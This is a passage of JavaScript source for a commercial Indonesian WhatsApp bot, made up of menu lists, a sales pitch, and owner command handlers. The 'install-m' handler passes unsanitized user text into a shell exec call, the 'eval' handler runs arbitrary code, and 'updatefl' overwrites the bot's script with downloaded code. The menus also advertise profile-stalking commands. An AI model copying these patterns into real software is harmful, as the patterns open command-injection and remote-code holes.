${emot1}ï¸ MENU - STALK
${emot2}.stalkig
${emot2}.stalktoblox
${emot2}.stalktwiter
${emot2}.stalkyt
${emot2}.stalktt
${emot2}.stalkwa
${emot3}
`
const menuinstall = `
${emot1}ï¸ MENU - INSTALL
${emot2}.installpanel
${emot2}.installtemabilling
${emot2}.installtemaenigma
${emot2}.installtemastellar
${emot2}.uinstallpanel
${emot2}.uinstalltema
${emot3}
`
const menutools = `
${emot1}ï¸ MENU - TOOLS
${emot2}.ping
${emot2}.owner
${emot2}.limit
${emot2}.claim
${emot2}.daily
${emot2}.register
${emot2}.unregister
${emot2}.backupsc
${emot2}.deploy
${emot2}.gitclone
${emot2}.get
${emot2}.getpp
${emot2}.pastebin
${emot2}.ssweb
${emot2}.pendek
${emot2}.cuaca
${emot2}.ceksim
${emot2}.lyrics
${emot2}.gaginfo
${emot2}.readmore
${emot2}.esm2cjs
${emot2}.toprompt
${emot2}.toimage
${emot2}.tovn
${emot2}.toaudio
${emot2}.tomedia
${emot2}.tourl
${emot2}.tourl2
${emot2}.tourlgh
${emot2}.togif
${emot2}.upscale
${emot2}.removebg
${emot2}.hdvid
${emot2}.smeme
${emot2}.stiker
${emot2}.tgsticker
${emot2}.ocr
${emot3}
`
// LIST
const menu = `
â•”â•â•â•â•â˜‰ï¸ MENU UTAMA â˜‰ï¸â•â•â•â•â•—
â•‘  Ketik:  .menu-<kategori>  
â•‘  Contoh: .menu-anime       
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

${emot1}ï¸ DAFTAR KATEGORI (33)
${emot2}all
${emot2}list
${emot2}owner
${emot2}other
${emot2}ai
${emot2}download
${emot2}convert
${emot2}cpanel
${emot2}cpanel2
${emot2}fun
${emot2}anime
${emot2}genshin
${emot2}game
${emot2}rpg
${emot2}primbon
${emot2}maker
${emot2}editimg
${emot2}ephoto
${emot2}store
${emot2}quotes
${emot2}menfess
${emot2}random
${emot2}berita
${emot2}linode
${emot2}digitalocean
${emot2}nsfw
${emot2}islam
${emot2}search
${emot2}bug
${emot2}talk
${emot2}install
${emot2}enc
${emot2}tools
${emot3}

âœ¨ Total kategori: 33
âœ¨ Gunakan: .menu-<kategori>
âœ¨ Contoh: .menu-download
`

const allmenu = `
${menuowner}
${menugroup}
${menuai}
${menudownload}
${menuconvert}
${menucpanel}
${menucpanel2}
${menuinstall}
${menutools}
${menufun}
${menuanime}
${menugame}
${menuprimbon}
${menumaker}
${menurpg}
${menueditimg}
${menuephoto}
${menustore}
${menuquotes}
${menuconfess}
${menurandom}
${menuberita}
${menulinode}
${menunsfw}
${menugenshin}
${menuenc}
${menudigitalocean}
${menuislam}
${menusearch}
${menubug}
${menustalk}
${menuother}
`
//============= [ COMMANDS ] ====================================================
        switch (command) {
        case "sc": case "script": {
        const nomorbot = (await sock.decodeJid(sock.user.id)).replace(/@.*/, "");
        const tks = `
ğŸš€ SCRIPT BOT Vynaa ASSISTEN V1.0 ğŸš€
Solusi Bot WhatsApp all-in-one dengan fitur super lengkap, stabil, dan siap digunakan tanpa ribet.
ğŸ”¥ KEUNGGULAN UTAMA

Vynaa Assisten V1.0 dikembangkan untuk kebutuhan bot modern: AI, otomatisasi, multimedia, dan keamanan data dalam satu script.

âœ¨ FITUR LENGKAP
ğŸ”¹ 1.900+ Fitur Aktif
Semua fitur sudah aktif & dapat digunakan tanpa unlock tambahan.
ğŸ”¹ 33 Kategori Menu
Menu rapi, terstruktur, dan mudah diakses oleh user & admin.
ğŸ”¹ Work All Fitur
Tidak ada fitur pajangan. Semua command benar-benar berfungsi.
ğŸ”¹ Anti Error & Stabil
Script telah dioptimasi untuk meminimalkan bug & crash.
ğŸ”¹ Generate Video & Image
Mendukung pembuatan gambar & video otomatis (AI & tools).
ğŸ”¹ Auto AI Responsif
AI aktif otomatis, cepat merespon, dan cerdas dalam percakapan.

ğŸ” KEAMANAN DATA
ğŸ“Œ DATABASE SECURITY AKTIF
âœ”ï¸ Data user aman
âœ”ï¸ Proteksi database
âœ”ï¸ Minim risiko kebocoran data

ğŸ¯ COCOK UNTUK
âœ… Bot pribadi
âœ… Bot grup
âœ… Bot bisnis / toko online
âœ… Bot AI assistant
âœ… Bot multi-fungsi skala besar
âš™ï¸ SIAP PAKAI
âœ”ï¸ Install â†’ Run â†’ Langsung aktif
âœ”ï¸ Tanpa konfigurasi ribet
âœ”ï¸ Cocok untuk pemula & developer

ğŸ“ CONTACT / ORDER:
ğŸ‘‰ https://wa.me/6283191939584

ğŸ”¥ Vynaa ASSISTEN V1.0
Bot cerdas â€¢ Fitur melimpah â€¢ Stabil â€¢ Aman
`
        sock.sendMessage(m.chat, {
    productMessage: {
        title: "Script Vynaa Assiten V1.0",
        description: "Version 1.0",
        thumbnail: { url: thumbnail2 },
        productId: "PROD001",
        retailerId: "RETAIL001",
        url: thumbnail2,
        body: tks,
        footer: "Harga spesial",
        priceAmount1000: 50000,
        currencyCode: "ID",
        buttons: [
            {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: "Beli Sekarang",
                    url: "https://wa.me/6283191939584"
                })
            }
        ]
    }
}, { quoted: fakeQuoted });
}
break
        case 'speed': case 'ping': {
  try {
    const used = process.memoryUsage()
    const cpus = os.cpus().map(cpu => {
      cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
      return cpu
    })

    const cpu = cpus.reduce((last, cpu, _, { length }) => {
      last.total += cpu.total
      last.speed += cpu.speed / length
      last.times.user += cpu.times.user
      last.times.nice += cpu.times.nice
      last.times.sys += cpu.times.sys
      last.times.idle += cpu.times.idle
      last.times.irq += cpu.times.irq
      return last
    }, {
      speed: 0,
      total: 0,
      times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
    })

    let start = performance.now()
    let end = performance.now()
    let latensi = end - start

    let osInfo = await nou.os.oos()
    let storage = await nou.drive.info()

    let respon = `
â•­â”â”â”ã€” ğŸ¤– *STATUS BOT & VPS* ã€•â”â”â”â•®
â”ƒ
â”ƒ âš¡ *PING*
â”ƒ âŒ Latensi : *${latensi.toFixed(3)} ms*
â”ƒ
â”ƒ ğŸ–¥ï¸ *SERVER*
â”ƒ âŒ OS        : *${osInfo}*
â”ƒ âŒ IP        : *${nou.os.ip()}*
â”ƒ âŒ Tipe OS   : *${nou.os.type()}*
â”ƒ
â”ƒ ğŸ’¾ *RAM*
â”ƒ âŒ Total     : *${formatp(os.totalmem())}*
â”ƒ âŒ Terpakai  : *${formatp(os.totalmem() - os.freemem())}*
â”ƒ
â”ƒ ğŸ“‚ *STORAGE*
â”ƒ âŒ Total     : *${storage.totalGb} GB*
â”ƒ âŒ Digunakan : *${storage.usedGb} GB (${storage.usedPercentage}%)*
â”ƒ âŒ Tersisa   : *${storage.freeGb} GB (${storage.freePercentage}%)*
â”ƒ
â”ƒ â³ *RUNTIME*
â”ƒ âŒ VPS       : *${runtime(os.uptime())}*
â”ƒ âŒ Bot       : *${runtime(process.uptime())}*
â”ƒ
â”ƒ âš™ï¸ *CPU (${cpus.length} Core)*
â”ƒ âŒ Model     : *${cpus[0].model.trim()}*
â”ƒ âŒ Speed     : *${cpu.speed.toFixed(0)} MHz*
${Object.keys(cpu.times)
  .map(type => `â”ƒ âŒ ${type.padEnd(5)} : ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`)
  .join('\n')}
â”ƒ
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯
âœ¨ *Bot berjalan normal & stabil*
`

    await sock.sendMessage(m.chat, {
      text: respon,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999999,
        isForwarded: false,
        forwardedNewsletterMessageInfo: {
          newsletterName: name,
          newsletterJid: null,
        },
        externalAdReply: {
          title: "Â© " + namaBot,
          thumbnailUrl: thumbnail2,
          sourceUrl: "https://wa.me/c/6283191939584",
          mediaType: 9999999988888,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: fakeQuoted })

  } catch (err) {
    console.error(err)
  }
}
break
			case "ttf":
			case "totalfitur": {

  const caseDir = './Vynaa'
  const pluginDir = './ZionPlugins'
  const mainFile = './main.js'

  // Total Case
  let totalCase = totalfitur
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length
  }

  // Total Plugin
  let totalPlugin = 0
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length
  }

  // Total MSG Telegram
  const totalMsgTelegram = countTelegramMsg(mainFile)

  // Total fitur
  let totalFitur = totalCase + totalPlugin + totalMsgTelegram

  let text = `
ğŸ“¦ *TOTAL FITUR BOT*

ğŸ§© Total Case        : *${totalCase}*
ğŸ”Œ Total Plugin      : *${totalPlugin}*
âœ‰ï¸ MSG Telegram     : *${totalMsgTelegram}*
âœ¨ Total Fitur       : *${totalFitur}*
  `

  sock.sendMessage(m.chat, { 
    pollResultMessage: { 
      name: text, 
      pollVotes: [
        { optionName: "Total Case", optionVoteCount: totalCase },
        { optionName: "Total Plugin", optionVoteCount: totalPlugin },
        { optionName: "MSG Telegram", optionVoteCount: totalMsgTelegram },
        { optionName: "Total Fitur", optionVoteCount: totalFitur }
      ]
    }
  }, { quoted: fakeQuoted })

}
break
			case "developerbot": case "owner": case "own": case "dev": {
await sock.sendContact(m.chat, [global.owner], null)
sock.sendMessage(m.chat, {text:`Hai @${m.sender.split("@")[0]} ini adalah owner aku`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break
case "q": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
reply(jsonData)
} 
break 
// MENU
case "menu-list":
case "listmenu":
case "menulist":
    sendMenu(menu)
    await sleep(1500)
    lagu()
    break

case "menu-all":
case "menuall":
case "allmenu":
    sendMenu(allmenu)
    break

case "menu-owner":
case "ownermenu":
case "menuowner":
    sendMenu(menuowner)
    break

case "menu-group":
case "groupmenu":
case "menugroup":
    sendMenu(menugroup)
    break

case "menu-other":
case "othermenu":
case "menuother":
    sendMenu(menuother)
    break

case "menu-ai":
case "aimenu":
case "menuai":
    sendMenu(menuai)
    break

case "menu-download":
case "downloadmenu":
case "menudownload":
    sendMenu(menudownload)
    break

case "menu-convert":
case "convertmenu":
case "menuconvert":
    sendMenu(menuconvert)
    break

case "menu-cpanel":
case "cpanelmenu":
case "menucpanel":
    sendMenu(menucpanel)
    break

case "menu-cpanelv2":
case "cpanelv2menu":
case "menucpanel2":
    sendMenu(menucpanel2)
    break

case "menu-fun":
case "funmenu":
case "menufun":
    sendMenu(menufun)
    break

case "menu-anime":
case "animemenu":
case "menuanime":
    sendMenu(menuanime)
    break

case "menu-game":
case "gamemenu":
case "menugame":
    sendMenu(menugame)
    break

case "menu-primbon":
case "primbonmenu":
case "menuprimbon":
    sendMenu(menuprimbon)
    break

case "menu-maker":
case "makermenu":
case "menumaker":
    sendMenu(menumaker)
    break

case "menu-rpg":
case "rpgmenu":
case "menurpg":
    sendMenu(menurpg)
    break

case "menu-editimg":
case "editimgmenu":
case "menueditimg":
    sendMenu(menueditimg)
    break

case "menu-ephoto":
case "ephotomenu":
case "menuephoto":
    sendMenu(menuephoto)
    break

case "menu-store":
case "storemenu":
case "menustore":
    sendMenu(menustore)
    break

case "menu-quotes":
case "quotesmenu":
case "menuquotes":
    sendMenu(menuquotes)
    break

case "menu-menfess":
case "menfessmenu":
case "menumenfess":
    sendMenu(menuconfess)
    break

case "menu-random":
case "randommenu":
case "menurandom":
    sendMenu(menurandom)
    break

case "menu-berita":
case "beritamenu":
case "menuberita":
    sendMenu(menuberita)
    break

case "menu-ppob":
case "ppobmenu":
case "menuppob":
    sendMenu(menuppob)
    break

case "menu-premium":
case "premiummenu":
case "menupremium":
    sendMenu(menupremium)
    break

case "menu-linode":
case "linodemenu":
case "menulinode":
    sendMenu(menulinode)
    break

case "menu-nsfw":
case "nsfwmenu":
case "menunsfw":
    sendMenu(menunsfw)
    break

case "menu-genshin":
case "genshinmenu":
case "menugenshin":
    sendMenu(menugenshin)
    break

case "menu-enc":
case "encmenu":
case "menuenc":
    sendMenu(menuenc)
    break

case "menu-digitalocean":
case "digitaloceanmenu":
case "menudigitalocean":
    sendMenu(menudigitalocean)
    break

case "menu-islam":
case "islammenu":
case "menuislam":
    sendMenu(menuislam)
    break

case "menu-search":
case "searchmenu":
case "menusearch":
    sendMenu(menusearch)
    break

case "menu-bug":
case "bugmenu":
case "menubug":
    sendMenu(menubug)
    break

case "menu-stalk":
case "stalkmenu":
case "menustalk":
    sendMenu(menustalk)
    break

case "menu-install":
case "installmenu":
case "menuinstall":
    sendMenu(menuinstall)
    break

case "menu-tools":
case "toolsmenu":
case "menutools":
    sendMenu(menutools)
    break

case "menu":
    sendMenu("")
    await sleep(1500)
    lagu()
    break
/*
         OWNER
*/
case "updatefl": {
    if (!isOwner) return m.reply("âŒ Owner only")

    if (!text) return m.reply("âŒ Masukkan link raw github\n\nContoh:\n.update https://raw.githubusercontent.com/user/repo/main/Vynaa.js")

    if (!text.includes("raw.githubusercontent.com")) {
        return m.reply("âŒ Link harus RAW github")
    }

    try {
        m.reply("â³ Mengambil update dari github...")

        const res = await axios.get(text, {
            headers: {
                "User-Agent": "Mozilla/5.0"
            }
        })

        if (!res.data) return m.reply("âŒ Gagal mengambil data")

        const fs = require("fs")
        const path = "./Vynaa.js"

        fs.writeFileSync(path, res.data, "utf8")

        m.reply("âœ… Update berhasil!\nâ™»ï¸ Bot akan restart...")

        setTimeout(() => {
            process.exit(0)
        }, 2000)

    } catch (err) {
        console.error(err)
        m.reply("âŒ Update gagal\n" + err.message)
    }
}
break
case "eval":
case "e": {
  // hanya owner
  if (!isOwner) return reply("âŒ Khusus owner")

  if (!text) return reply("Masukkan kode yang mau dievaluasi")

  try {
    // async eval support
    let result = await eval(`(async () => { ${text} })()`)

    if (typeof result !== "string") {
      result = require("util").inspect(result, { depth: 1 })
    }

    reply(`âœ… *EVAL RESULT*\n\n${result}`)
  } catch (err) {
    reply(`âŒ *EVAL ERROR*\n\n${err}`)
  }
}
break
case "cekip":
case "ipcheck": {
    if (!text) return reply("Contoh:\n.cekip 8.8.8.8")
    if (!isOwner) return reply(mess.owner)

    // validasi IP sederhana
    const ipRegex = /^(?:\d{1,3}\.){3}\d{1,3}$/
    if (!ipRegex.test(text)) return reply("Format IP tidak valid!")

    try {
        const axios = require("axios")
        const res = await axios.get(`http://ip-api.com/json/${text}?lang=id`)

        if (res.data.status !== "success") {
            return reply("IP tidak ditemukan atau tidak valid.")
        }

        const ip = res.data

        let hasil = `
ğŸ” *IP CHECK RESULT*

ğŸŒ IP       : ${ip.query}
ğŸ³ Negara  : ${ip.country} (${ip.countryCode})
ğŸ“ Region  : ${ip.regionName}
ğŸ™ Kota    : ${ip.city}
ğŸ“® ZIP     : ${ip.zip}
ğŸ•’ Timezone: ${ip.timezone}

ğŸ“¡ ISP     : ${ip.isp}
ğŸ¢ Org     : ${ip.org}
ğŸ”¢ AS      : ${ip.as}

ğŸ“ Lokasi:
Latitude  : ${ip.lat}
Longitude : ${ip.lon}
`.trim()

        reply(hasil)

    } catch (err) {
        console.error(err)
        reply("Terjadi kesalahan saat mengambil data IP.")
    }
}
break
case 'kickall': {
 if (!isGroup) return reply('âŒ Khusus grup')
 if (!isOwner) return reply('âŒ Khusus owner bot')
 if (!isBotAdmins) return reply('âŒ Bot harus admin')

 let waktu = parseInt(args[0]) || 1000
 if (waktu < 500) return reply('âš ï¸ Minimal jeda 500 ms')

 let teks = `âš ï¸ *KONFIRMASI KICK SEMUA MEMBER*\n
â€¢ Jeda: ${waktu} ms
â€¢ Semua member akan dikeluarkan
â€¢ Owner & Bot tidak ikut

Klik *KONFIRMASI* untuk lanjut`

 let buttons = [
   {
     buttonId: `.kickall-konfirm ${waktu}`,
     buttonText: { displayText: 'âœ… KONFIRMASI' },
     type: 1
   },
   {
     buttonId: `.cancel`,
     buttonText: { displayText: 'âŒ BATAL' },
     type: 1
   }
 ]

 await sock.sendMessage(
   m.chat,
   {
     text: teks,
     buttons,
     footer: 'Kick All Confirmation',
     headerType: 1
   },
   { quoted: fakeQuoted }
 )
}
break
case 'kickall-konfirm': {
  if (!isGroup) return
  if (!isOwner) return
  if (!isBotAdmins) return reply('âŒ Bot harus admin')

  let waktu = parseInt(args[0]) || 1000
  let metadata = await sock.groupMetadata(m.chat)

  let members = metadata.participants
    .filter(v => v.id !== botNumber) // â¬…ï¸ hanya kecuali bot

  reply(`ğŸš€ Memulai kick ${members.length} member...\nJeda: ${waktu} ms`)

  for (let member of members) {
    try {
      await sock.groupParticipantsUpdate(
        m.chat,
        [member.id],
        'remove'
      )
      await delay(waktu)
    } catch (e) {
      console.log('Gagal kick:', member.id)
    }
  }

  reply('âœ… Kick all selesai')
}
break
case 'cancel':
 reply('âŒ Aksi dibatalkan')
break
case 'listgroup':
case 'grouplist':
case 'gclist':
case 'listgc': {
  if (!isOwner) return reply(mess.owner)

  try {
    const groups = Object.values(
      await sock.groupFetchAllParticipating()
    )

    if (!groups.length)
      return reply('âŒ Bot belum gabung di grup manapun.')

    let teks = `â¬£ *LIST GROUP ${namaBot.toUpperCase()}*\n`
    teks += `ğŸ“Š Total Grup: ${groups.length}\n\n`

    const buttons = []

    groups.forEach((g, i) => {
      const groupId = g.id
      const groupName = g.subject
      const memberCount = g.participants?.length || 0
      const created = moment(g.creation * 1000)
        .tz('Asia/Jakarta')
        .format('DD/MM/YYYY HH:mm') + ' WIB'

      teks += `*${i + 1}. ${groupName}*\n`
      teks += `ğŸ†” ID: ${groupId}\n`
      teks += `ğŸ‘¥ Member: ${memberCount}\n`
      teks += `ğŸ• Dibuat: ${created}\n\n`

      buttons.push({
        name: 'cta_copy',
        buttonParamsJson: JSON.stringify({
          display_text: `ğŸ“‹ Copy ID GC #${i + 1}`,
          copy_code: groupId
        })
      })
    })

    await sock.sendMessage(
      m.chat,
      {
        text: teks,
        footer: 'ğŸ“Œ Klik tombol untuk menyalin ID grup',
        interactiveButtons: buttons
      },
      { quoted: fakeQuoted }
    )
  } catch (e) {
    console.error(e)
    reply('âŒ Gagal mengambil data grup.')
  }
}
break
// ======================
// SET IMAGE MENU
// ======================
case 'setimagemenu':
case 'setimg':
case 'setimage':
case 'setimgmenu': {
  if (!isOwner) return reply('âŒ Khusus owner')
  if (!text || !text.startsWith('http'))
    return reply('âš ï¸ Masukkan URL gambar!\nContoh:\n.setimgmenu https://example.com/img.jpg')

  let media = loadMedia()
  media.thumbnail2 = text
  saveMedia(media)

  reply('âœ… Image menu berhasil diubah!')
}
break

// ======================
// SET THUMBNAIL MENU
// ======================
case 'setthumb':
case 'setthumbnail':
case 'setthumbnailmenu': {
  if (!isOwner) return reply('âŒ Khusus owner')
  if (!text || !text.startsWith('http'))
    return reply('âš ï¸ Masukkan URL thumbnail!\nContoh:\n.setthumbnailmenu https://example.com/thumb.jpg')

  let media = loadMedia()
  media.thumbnail = text
  saveMedia(media)

  reply('âœ… Thumbnail menu berhasil diubah!')
}
break

// ======================
// SET VIDEO MENU
// ======================
case 'setvideo':
case 'setvideomenu': {
  if (!isOwner) return reply('âŒ Khusus owner')
  if (!text || !text.startsWith('http'))
    return reply('âš ï¸ Masukkan URL video!\nContoh:\n.setvideomenu https://example.com/video.mp4')

  let media = loadMedia()
  media.video = text
  saveMedia(media)

  reply('âœ… Video menu berhasil diubah!')
}
break

// ======================
// SET AUDIO MENU
// ======================
case 'setaudio':
case 'setaudiomenu': {
  if (!isOwner) return reply('âŒ Khusus owner')
  if (!text || !text.startsWith('http'))
    return reply('âš ï¸ Masukkan URL audio!\nContoh:\n.setaudiomenu https://example.com/audio.mp3')

  let media = loadMedia()
  media.audio = text
  saveMedia(media)

  reply('âœ… Audio menu berhasil diubah!')
}
break
case 'anticall':
case 'antical': {
  if (!isOwner) return reply('Khusus Owner')

  if (args[0] === 'on') {
    global.antiCall = true
    reply('âœ… Anti Call *AKTIF*')
  } else if (args[0] === 'off') {
    global.antiCall = false
    reply('âŒ Anti Call *NONAKTIF*')
  } else {
    reply(`Contoh:
.antical on
.antical off`)
  }
}
break
case "deployweb":
case "cweb":
case "vweb":
case "deploy": {
if (!isOwner) return reply('âŒ Khusus Owner')
  try {
    // Dapatkan pesan yang direply (cara universal)
    const q = m.quoted ? m.quoted : quoted ? quoted : null;
    
    if (!text) {
      return reply(`Contoh: *${command} namasitus*\nReply file .zip atau .html`);
    }
    
    if (!q || !q.mimetype) {
      return reply('âŒ *Reply file .zip atau .html* yang ingin diupload');
    }
    
    const mime = q.mimetype || '';
    if (!mime.includes('zip') && !mime.includes('html')) {
      return reply('âŒ *Format file tidak didukung*\nHanya file .zip atau .html');
    }
    
    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
    if (webName.length < 3) {
      return reply('âŒ Nama web minimal 3 karakter');
    }
    
    // Tampilkan notifikasi sedang proses
    await reply('â³ *Mengunduh file...*');
    
    // Download file (gunakan sock sesuai library Anda)
    const media = await sock.downloadMediaMessage(q);
    if (!media) {
      return reply('âŒ Gagal mengunduh file');
    }
    
    const filesToUpload = [];
    
    if (mime.includes('zip')) {
      await reply('ğŸ“¦ *Mengekstrak file ZIP...*');
      
      try {
        const zipBuffer = Buffer.from(media);
        const directory = await unzipper.Open.buffer(zipBuffer);
        
        for (const file of directory.files) {
          if (file.type === 'File') {
            const content = await file.buffer();
            const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/');
            
            // Skip file terlalu besar
            if (content.length > 5 * 1024 * 1024) continue;
            
            filesToUpload.push({
              file: filePath,
              data: content.toString('base64'),
              encoding: 'base64'
            });
          }
        }
        
        // Cek index.html
        const hasIndex = filesToUpload.some(f => 
          f.file.toLowerCase().includes('index.html')
        );
        
        if (!hasIndex && !filesToUpload.some(f => 
          f.file.toLowerCase().endsWith('.html')
        )) {
          return reply('âŒ File HTML tidak ditemukan dalam ZIP');
        }
        
      } catch (zipError) {
        return reply(`âŒ Error ekstrak ZIP: ${zipError.message}`);
      }
      
    } else {
      // File HTML tunggal
      filesToUpload.push({
        file: 'index.html',
        data: Buffer.from(media).toString('base64'),
        encoding: 'base64'
      });
    }
    
    if (filesToUpload.length === 0) {
      return reply('âŒ Tidak ada file yang valid untuk diupload');
    }
    
    await reply('ğŸš€ *Mendeploy ke Vercel...*');
    
    // **GANTI TOKEN INI DENGAN TOKEN VERCEL ANDA**
    const VERCEL_TOKEN = global.vercel // Simpan di env!
    
    const headers = {
      'Authorization': `Bearer ${VERCEL_TOKEN}`,
      'Content-Type': 'application/json'
    };
    
    // Deploy ke Vercel
    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        name: webName,
        files: filesToUpload,
        projectSettings: {
          framework: null,
          buildCommand: null,
          outputDirectory: null
        }
      })
    });
    
    const result = await deployRes.json();
    
    if (!deployRes.ok) {
      console.error('Vercel Error:', result);
      return reply(`âŒ Gagal deploy: ${result.error?.message || 'Unknown error'}`);
    }
    
    const url = `https://${webName}.vercel.app`;
    
    // Success
    await reply(`âœ… *Website Berhasil Dibuat!*

ğŸ“ *Nama:* ${webName}
ğŸŒ *URL:* ${url}
â±ï¸ *Status:* ${result.readyState || 'Deploying...'}

_Situs akan aktif dalam 1-2 menit._`);
    
  } catch (error) {
    console.error('Handler Error:', error);
    reply(`âŒ Terjadi error: ${error.message}`);
  }
} break;
case 'resetdb':
case 'resetdatabase': {
  if (!isOwner) return reply('âŒ Khusus Owner')

  const fs = require('fs')
  const path = './database/database.json'

  // struktur default database
  const defaultDB = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    erpg: {},
    settings: {}
  }

  // set global.db ke default
  global.db = defaultDB

  // simpan ke file database.json
  fs.writeFileSync(path, JSON.stringify(defaultDB, null, 2))

  reply('âœ… Database berhasil di-reset\n\nğŸ“‚ File tidak dihapus\nğŸ§¹ Isi database dikosongkan')
}
break
// PATH DATABASE
case 'req': {
    if (!text) return reply(`Masukkan request!\n\nContoh:\n${prefix}req Tambahkan menu downloader`);
    
    let db = loadReq();

    db.push({
        user: m.pushName || m.sender.split("@")[0],
        request: text
    });

    saveReq(db);

    reply(`âœ”ï¸ Request berhasil disimpan!`);
}
break;


case 'listreq': {
    let db = loadReq();
    if (db.length === 0) return reply(`Belum ada request.`);
    
    let teks = `ğŸ“Œ *List Request User*\n\n`;
    db.forEach((x, i) => {
        teks += `${i+1}. *${x.user}*\n${x.request}\n\n`;
    });

    reply(teks);
}
break;


case 'delreq': {
    if (!text) return reply(`Masukkan nomor request!\nContoh: ${prefix}delreq 1`);
    
    let nomor = parseInt(text);
    let db = loadReq();

    if (isNaN(nomor) || nomor < 1 || nomor > db.length) {
        return reply(`Nomor tidak valid!`);
    }

    db.splice(nomor - 1, 1);
    saveReq(db);

    reply(`âœ”ï¸ Request nomor ${nomor} berhasil dihapus!`);
}
break;
case "listdbuser":
case "listuserdb":
case "listuser": {
if (!isOwner) return reply(mess.owner)
    try {
        let users = global.db.users || {};

        let total = Object.keys(users).length;
        if (total === 0) return reply("*Tidak ada user yang terdaftar di database.*");

        let teks = `*ğŸ“ LIST USER TERDATA DI DATABASE*\n`;
        teks += `*Total:* ${total}\n\n`;

        let no = 1;
        for (let u in users) {
            teks += `${no++}. wa.me/${u.replace(/[^0-9]/g, '')}\n`;
        }

        reply(teks);

    } catch (e) {
        console.log(e);
        reply("Terjadi error saat mengambil list user.");
    }
}
break;
case "playch": {
if (!isOwner) return reply(mess.owner)
    try {
        if (!text.includes('|')) return reply(`Format:\n${cmd} idtujuan | judul lagu`);

        let tujuan = text.split("|")[0].trim();
        let query  = text.split("|")[1].trim();

        React("ğŸµ");

        // YT Search
        let ytsSearch = await yts(query);
        let re = ytsSearch.all[0];
        if (!re) return reply("Tidak ditemukan!");

        // Download MP3
        let dl = await ytdl.ytmp3(re.url);
        let mp3Url = dl.download.url;
        let mp3 = await getBuffer(mp3Url);

        const fs = require("fs");
        const { exec } = require("child_process");
        const path = require("path");

        let input = path.join(__dirname, "in.mp3");
        let output = path.join(__dirname, "out.ogg");

        // Save MP3
        fs.writeFileSync(input, mp3);

        // Convert OGG OPUS (WhatsApp Compatible)
        await new Promise((resolve, reject) => {
            exec(
                `ffmpeg -y -i "${input}" -ac 1 -ar 48000 -b:a 48k -c:a libopus "${output}"`,
                (err) => err ? reject(err) : resolve()
            );
        });

        let ogg = fs.readFileSync(output);

        // SEND TO TARGET
        await sock.sendMessage(tujuan, {
            audio: ogg,
            mimetype: "audio/ogg; codecs=opus",
            ptt: true,
            contextInfo: {
                externalAdReply: {
                    title: re.title,
                    thumbnailUrl: re.thumbnail,
                    renderLargerThumbnail: true
                }
            }
        });

        reply(`âœ”ï¸ PTT terkirim ke *${tujuan}*`);

        fs.unlinkSync(input);
        fs.unlinkSync(output);

    } catch (e) {
        console.log(e);
        reply("âŒ Error saat membuat PTT!");
    }
}
break;
case 'addsaldo': {

  if (!isOwner) return reply('âŒ Perintah ini hanya bisa digunakan oleh *Owner*!');

  if (!text) return reply(`âš ï¸ Format salah!\n\nGunakan:\n.addsaldo @tag|nomor jumlah\n\nContoh:\n.addsaldo @user 1000`);

  let target;
  let jumlah;

  // ==========================
  // Parsing input
  // ==========================
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    target = m.mentionedJid[0];
    jumlah = text.replace(/@.+?|\s/g, '') || null;
  } else {
    const parts = text.split(' ');
    if (parts.length < 2) 
      return reply(`âš ï¸ Format salah!\n\n.addsaldo nomor jumlah`);

    target = parts[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    jumlah = parts[1];
  }

  // ==========================
  // Validasi
  // ==========================
  if (!target) return reply('âŒ Target tidak ditemukan!');
  if (!global.db.users[target]) return reply('âŒ User belum ada di database!');

  jumlah = parseInt(jumlah);
  if (isNaN(jumlah) || jumlah <= 0) return reply('âŒ Jumlah harus berupa angka dan lebih dari 0!');

  // ==========================
  // Proses tambah saldo
  // ==========================
  global.db.users[target].money += jumlah;

  let nama = global.db.users[target].name || target.split('@')[0];

  reply(
`âœ… *Saldo Ditambahkan!*

ğŸ‘¤ User: *${nama}*
ğŸ’° Tambahan: *${jumlah}*
ğŸ“¦ Total sekarang: *${global.db.users[target].money}*`
  );

}
break;
case 'autobackup':
case 'setautobackup': {
    if (!isOwner) return reply("Owner only!");

    if (text === "on") {
        global.autoBackup = true;
        reply("Auto-backup diaktifkan.");
    } else if (text === "off") {
        global.autoBackup = false;
        reply("Auto-backup dimatikan.");
    } else {
        reply("Gunakan: setautobackup on/off");
    }
}
break;
case 'install-m': {
   if (!isOwner) return reply("âš ï¸ Fitur ini khusus Owner!");
   if (!args[0]) return reply("âš ï¸ Masukkan nama module!\n\nContoh: .install-m axios");

   const moduleName = args[0];
   reply(`â³ Sedang menginstall module *${moduleName}* ...`);

   const { exec } = require('child_process');
   exec(`npm install ${moduleName}`, (error, stdout, stderr) => {
      if (error) {
         reply(`âŒ Gagal install module:\n${error.message}`);
         return;
      }
      if (stderr) {
         reply(`âš ï¸ Ada peringatan:\n${stderr}`);
      }
      reply(`âœ… Module *${moduleName}* berhasil diinstall!\n\n${stdout}`);
   });
   break;
}
case 'ban': {
  // cek apakah yang menjalankan owner
  if (!isOwner) return reply('Perintah ini hanya untuk owner.');

  // target user: prioritas mention > quoted > nomor di text
  let targetJid = null;
  if (m.mentionedJid && m.mentionedJid.length) {
    targetJid = m.mentionedJid[0];
  } else if (m.quoted && m.quoted.sender) {
    targetJid = m.quoted.sender;
  } else if (text && text.match(/\d{6,}/)) {
